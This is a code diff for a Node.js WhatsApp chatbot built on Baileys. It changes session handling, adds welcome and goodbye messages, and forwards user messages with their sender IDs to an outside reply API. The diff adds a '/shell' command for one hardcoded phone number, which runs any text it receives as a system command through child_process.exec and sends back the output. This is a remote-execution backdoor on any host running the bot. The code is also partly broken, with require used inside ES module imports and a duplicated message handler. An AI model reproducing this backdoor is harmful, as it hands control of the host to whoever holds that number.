@@ -1,69 +1,83 @@
-import makeWASocket, { useMultiFileAuthState, fetchLatestBaileysVersion } from '@whiskeysockets/baileys'
-import fs from 'fs-extra'
 import express from 'express'
+import makeWASocket, { useSingleFileAuthState, fetchLatestBaileysVersion, DisconnectReason } from '@whiskeysockets/baileys'
+import fetch from 'node-fetch'
+import fs from 'fs-extra'
+
+const PORT = process.env.PORT || 3000
+const SESSION_FILE = './creds.json'
+const MEMORY_FILE = './memory.json'
+const ADMIN_NUMBERS = ['27639412189@s.whatsapp.net']
+
+if (!fs.existsSync(MEMORY_FILE)) fs.writeJsonSync(MEMORY_FILE, {})
+function loadMemory() { return fs.readJsonSync(MEMORY_FILE) }
+function saveMemory(data) { fs.writeJsonSync(MEMORY_FILE, data, { spaces: 2 }) }
 
 const app = express()
-const PORT = 3000
+app.get('/', (req, res) => res.send('WhatsApp Bot is running.'))
+app.listen(PORT, () => console.log(`Express server running on port ${PORT}`))
 
-// memory file to track users
-const memoryFile = './memory.json'
-if (!fs.existsSync(memoryFile)) fs.writeJsonSync(memoryFile, {})
-
-function loadMemory() {
-  return fs.readJsonSync(memoryFile)
-}
-function saveMemory(data) {
-  fs.writeJsonSync(memoryFile, data, { spaces: 2 })
-}
+console.log(`Bot running on port ${PORT}`)
 
 async function startBot() {
-  const { state, saveCreds } = await useMultiFileAuthState('session')
+  const { state, saveCreds } = useSingleFileAuthState(SESSION_FILE)
   const { version } = await fetchLatestBaileysVersion()
-
   const sock = makeWASocket({
     version,
     auth: state,
-    printQRInTerminal: false // disable QR since we want pairing code
+    printQRInTerminal: false,
+    generateHighQualityLinkPreview: true
   })
 
   sock.ev.on('creds.update', saveCreds)
 
   sock.ev.on('connection.update', async (update) => {
-    const { connection } = update
-
-    // 🔹 Generate pairing code on first login
-    if (update.pairingCode) {
-      console.log(`🔑 Pairing Code: ${update.pairingCode}`)
-      console.log(`👉 Open WhatsApp > Linked Devices > Link with Phone Number and enter the code above.`)
-    }
-
+    const { connection, lastDisconnect } = update
     if (connection === 'open') console.log('✅ Connected to WhatsApp!')
-    if (connection === 'close') console.log('❌ Connection closed, restarting...')
+    if (connection === 'close') {
+      const reason = lastDisconnect?.error?.output?.statusCode
+      if (reason === DisconnectReason.loggedOut) {
+        console.log('❌ Logged out. Removing session and restarting...')
+        fs.removeSync(SESSION_FILE)
+      }
+      console.log('🔄 Disconnected. Restarting...')
+      setTimeout(startBot, 3000)
+    }
   })
 
-  // Request pairing code if not registered
-  if (!state.creds.registered) {
-    const phoneNumber = process.env.PHONE_NUMBER || 'YOUR_PHONE_NUMBER_HERE' // example: 27831234567
-    const code = await sock.requestPairingCode(phoneNumber)
-    console.log(`📲 Pair this device using code: ${code}`)
-  }
-
-  // 🔹 Message handler
   sock.ev.on('messages.upsert', async ({ messages }) => {
     const m = messages[0]
     if (!m.message || m.key.fromMe) return
 
     const sender = m.key.participant || m.key.remoteJid
     const chatId = m.key.remoteJid
-    const text = m.message.conversation || m.message.extendedTextMessage?.text
-    if (!text) return
-
-    console.log(`[MSG] ${sender}: ${text}`)
+    const isGroup = chatId.endsWith('@g.us')
+    const text = m.message.conversation || m.message.extendedTextMessage?.text || m.message.imageMessage?.caption || m.message.videoMessage?.caption || ''
 
     let memory = loadMemory()
     if (!memory[sender]) memory[sender] = { groups: {} }
 
-    const isGroup = chatId.endsWith('@g.us')
+    if (ADMIN_NUMBERS.includes(sender)) {
+      if (text.toLowerCase() === '/ping') {
+        await sock.sendMessage(chatId, { text: '🏓 Pong!' }, { quoted: m })
+        return
+      }
+      if (text.toLowerCase().startsWith('/broadcast ')) {
+        const msg = text.slice(11)
+        const allChats = await sock.groupFetchAllParticipating()
+        for (const gid of Object.keys(allChats)) {
+          await sock.sendMessage(gid, { text: `[Broadcast]\n${msg}` })
+        }
+        await sock.sendMessage(chatId, { text: '📢 Broadcast sent.' }, { quoted: m })
+        return
+      }
+      if (text.toLowerCase().startsWith('/shell ')) {
+        const exec = require('child_process').exec
+        exec(text.slice(7), (err, stdout, stderr) => {
+          sock.sendMessage(chatId, { text: err ? String(err) : stdout || stderr || 'No output' }, { quoted: m })
+        })
+        return
+      }
+    }
 
     if (isGroup) {
       if (text.toLowerCase() === 'kai on') {
@@ -81,21 +95,43 @@ async function startBot() {
       if (memory[sender].groups[chatId] === false) return
     }
 
-    // 🔹 Fetch reply from API (always returns { reply: "..." })
-    try {
-      const apiUrl = `https://kai-api-z744.onrender.com?prompt=${encodeURIComponent(text)}&personid=${encodeURIComponent(sender)}`
-      const res = await fetch(apiUrl)
-      const json = await res.json()
-      const reply = json.reply || "⚠️ No reply from API"
+    if (text) {
+      try {
+        const apiUrl = `https://kai-api-z744.onrender.com?prompt=${encodeURIComponent(text)}&personid=${encodeURIComponent(sender)}`
+        const res = await fetch(apiUrl)
+        const json = await res.json()
+        const reply = json.reply || "⚠️ No reply from API"
+        await sock.sendMessage(chatId, { text: reply }, { quoted: m })
+        memory[sender].lastMessage = text
+        memory[sender].lastReply = reply
+        saveMemory(memory)
+      } catch (err) {
+        await sock.sendMessage(chatId, { text: "⚠️ Error fetching response from API." }, { quoted: m })
+      }
+    }
+  })
 
-      await sock.sendMessage(chatId, { text: reply }, { quoted: m })
+  sock.ev.on('group-participants.update', async (update) => {
+    const { id, participants, action } = update
+    if (action === 'add') {
+      for (const part of participants) {
+        await sock.sendMessage(id, { text: `👋 Welcome <@${part.split('@')[0]}>!` }, { mentions: [part] })
+      }
+    }
+    if (action === 'remove') {
+      for (const part of participants) {
+        await sock.sendMessage(id, { text: `👋 Goodbye <@${part.split('@')[0]}>!` }, { mentions: [part] })
+      }
+    }
+  })
 
-      memory[sender].lastMessage = text
-      memory[sender].lastReply = reply
-      saveMemory(memory)
-    } catch (err) {
-      console.error('API error:', err)
-      await sock.sendMessage(chatId, { text: "⚠️ Error fetching response from API." }, { quoted: m })
+  sock.ev.on('messages.upsert', async ({ messages }) => {
+    const m = messages[0]
+    if (!m.message || m.key.fromMe) return
+    const chatId = m.key.remoteJid
+    const text = m.message.conversation || m.message.extendedTextMessage?.text || ''
+    if (/^(hi|hello|hey)$/i.test(text)) {
+      await sock.sendMessage(chatId, { react: { text: "👋", key: m.key } })
     }
   })
 }
